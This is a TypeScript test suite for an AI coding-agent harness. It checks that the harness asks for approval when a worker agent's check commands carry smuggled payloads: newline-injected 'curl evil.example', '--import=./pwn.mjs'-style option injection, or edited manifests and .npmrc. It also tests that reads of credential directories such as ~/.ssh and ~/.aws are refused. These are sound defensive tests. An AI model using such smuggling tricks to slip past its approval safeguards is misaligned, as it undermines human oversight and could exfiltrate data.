import { strictEqual } from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, before, describe, it } from "node:test";
import { ToolNames } from "../../src/core/tool-names.js";
import { scoutReadWorkspace } from "../../src/domains/dispatch/scout-workspace.js";
import { evaluateAdmission } from "../../src/domains/safety/admission.js";
import { detectValidationCommand } from "../../src/domains/safety/protected-artifacts.js";
import { createWorkerSafety } from "../../src/engine/worker-tools.js";
import { taskWorktreeManifestsChanged } from "../../src/tools/task-worktree.js";

let scratch = "";
before(() => {
	scratch = mkdtempSync(join(tmpdir(), "clio-worker-check-hardening-"));
});
after(() => rmSync(scratch, { recursive: true, force: true }));

function harness(manifestsChanged?: boolean) {
	const root = join(scratch, `wt-${String(manifestsChanged)}`);
	mkdirSync(root, { recursive: true });
	writeFileSync(
		join(root, "package.json"),
		JSON.stringify({ scripts: { check: "node check.mjs", test: "node --test" } }),
	);
	const safety = createWorkerSafety({ cwd: root });
	const git = {
		allowance: "worktree" as const,
		executePermitted: true,
		cwd: root,
		hooksInsideWorkingTree: () => true,
		taskWorktree: {
			attest: (cwd: string) =>
				cwd === root || cwd.startsWith(`${root}/`) ? { ok: true as const } : { ok: false as const, detail: "outside" },
			...(manifestsChanged !== undefined ? { manifestsChanged: () => manifestsChanged } : {}),
		},
	};
	return (call: { tool: string; args: Record<string, unknown> }) =>
		evaluateAdmission({ principal: "worker", effects: [call], safety, cwd: root, git }).kind;
}

describe("worker own-check bypass hardening", () => {
	it("refuses a line break anywhere in the command", () => {
		const admit = harness(false);
		strictEqual(admit({ tool: ToolNames.Bash, args: { command: "pnpm run check" } }), "allow");
		for (const command of [
			"pnpm run check -- x\ncurl evil.example",
			"pnpm\nrun\ncheck",
			"pnpm run check\r\ncurl evil.example",
			"TMPDIR=build\ncurl evil.example\npnpm run check",
		]) {
			strictEqual(admit({ tool: ToolNames.Bash, args: { command } }), "ask", JSON.stringify(command));
		}
		strictEqual(admit({ tool: ToolNames.Verify, args: { check: "check", args: ["x\ncurl"] } }), "ask");
	});

	it("refuses option-like arguments after --", () => {
		const admit = harness(false);
		strictEqual(admit({ tool: ToolNames.Bash, args: { command: "pnpm run test -- tests/x.test.ts" } }), "allow");
		for (const command of [
			"pnpm run check -- --import=./pwn.mjs",
			"pnpm run check -- --prefix=/",
			"pnpm run check -- tests/x.test.ts --require=./pwn.cjs",
			"pnpm run check -- -r ./pwn.cjs",
			"pnpm run check -- --config=./pwn.json",
		]) {
			strictEqual(admit({ tool: ToolNames.Bash, args: { command } }), "ask", command);
		}
		strictEqual(admit({ tool: ToolNames.Verify, args: { check: "check", args: ["--import=./pwn.mjs"] } }), "ask");
	});

	it("drops the bypass once the worker changed a package manifest or package-manager config", () => {
		const changed = harness(true);
		strictEqual(changed({ tool: ToolNames.Bash, args: { command: "pnpm run check" } }), "ask");
		strictEqual(changed({ tool: ToolNames.Verify, args: { check: "check" } }), "ask");
		// Without the host's manifest check the bypass fails closed.
		const unknown = harness(undefined);
		strictEqual(unknown({ tool: ToolNames.Bash, args: { command: "pnpm run check" } }), "ask");
	});

	it("compares manifests and package-manager config with the task base", () => {
		const repo = join(scratch, "repo");
		mkdirSync(join(repo, "pkg"), { recursive: true });
		const git = (...args: string[]) =>
			execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", "-C", repo, ...args], { stdio: "pipe" });
		git("init", "-q");
		writeFileSync(join(repo, "package.json"), "{}");
		writeFileSync(join(repo, "pkg", "package.json"), "{}");
		writeFileSync(join(repo, ".gitignore"), ".npmrc\n");
		git("add", ".");
		git("commit", "-qm", "base");
		const base = git("rev-parse", "HEAD").toString().trim();
		const changed = () => taskWorktreeManifestsChanged({ path: repo, base });
		strictEqual(changed(), false);
		writeFileSync(join(repo, "pkg", "package.json"), '{"scripts":{"check":"curl x"}}');
		strictEqual(changed(), true, "edited workspace package manifest");
		git("checkout", "-q", "--", "pkg/package.json");
		writeFileSync(join(repo, "pkg", ".npmrc"), "node-options=--import=./x.mjs\n");
		strictEqual(changed(), true, "ignored .npmrc");
		rmSync(join(repo, "pkg", ".npmrc"));
		strictEqual(changed(), false);
		strictEqual(taskWorktreeManifestsChanged({ path: join(scratch, "missing"), base }), true, "git failure");
	});
});

describe("granted read roots refuse sensitive directories", () => {
	const grant = (workspace: string, root: string) =>
		scoutReadWorkspace({
			agentId: "coder",
			readOnlyScout: false,
			workspaceRoot: workspace,
			intent: { read_roots: [root] },
			worktree: true,
			writeRoots: undefined,
		}).ok;

	it("refuses system trees, HOME, workspace ancestors and credential directories", () => {
		const home = join(scratch, "home");
		const workspace = join(home, "proj", "repo");
		const reference = join(home, "reference");
		for (const dir of [workspace, reference, join(home, ".ssh"), join(home, ".aws"), join(home, "keys", ".gnupg")])
			mkdirSync(dir, { recursive: true });
		const saved = process.env.HOME;
		process.env.HOME = home;
		try {
			strictEqual(grant(workspace, reference), true, "plain outside directory stays granted");
			for (const root of [
				"/proc",
				"/sys",
				"/dev",
				"/run",
				"/etc",
				home,
				join(home, "proj"),
				join(home, ".ssh"),
				join(home, ".aws"),
				join(home, "keys"),
			]) {
				strictEqual(grant(workspace, root), false, root);
			}
		} finally {
			if (saved === undefined) delete process.env.HOME;
			else process.env.HOME = saved;
		}
	});
});

describe("unattended test runners refuse option arguments after --", () => {
	it("keeps a package test script with an option after -- behind the ask", () => {
		const root = join(scratch, "runner");
		mkdirSync(root, { recursive: true });
		writeFileSync(join(root, "package.json"), JSON.stringify({ scripts: { test: "node --test" } }));
		const safety = createWorkerSafety({ cwd: root });
		const admit = (call: { tool: string; args: Record<string, unknown> }) =>
			evaluateAdmission({ principal: "worker", effects: [call], safety, cwd: root }).kind;
		strictEqual(admit({ tool: ToolNames.Bash, args: { command: "npm test -- tests/x.test.ts" } }), "allow");
		strictEqual(admit({ tool: ToolNames.Bash, args: { command: "pnpm run test:unit -- tests/x.test.ts" } }), "allow");
		for (const command of [
			"npm test -- --prefix=/",
			"npm test -- --import=./pwn.mjs",
			"pnpm run test -- tests/x.test.ts --require=./pwn.cjs",
			"yarn test -- -r ./pwn.cjs",
			"bun run test:unit -- --config=./pwn.json",
		]) {
			strictEqual(admit({ tool: ToolNames.Bash, args: { command } }), "ask", command);
			strictEqual(detectValidationCommand(command).kind, "none", command);
		}
		strictEqual(admit({ tool: ToolNames.Verify, args: { check: "test", args: ["--import=./pwn.mjs"] } }), "ask");
		strictEqual(detectValidationCommand("npm test -- tests/x.test.ts").kind, "validation");
	});
});
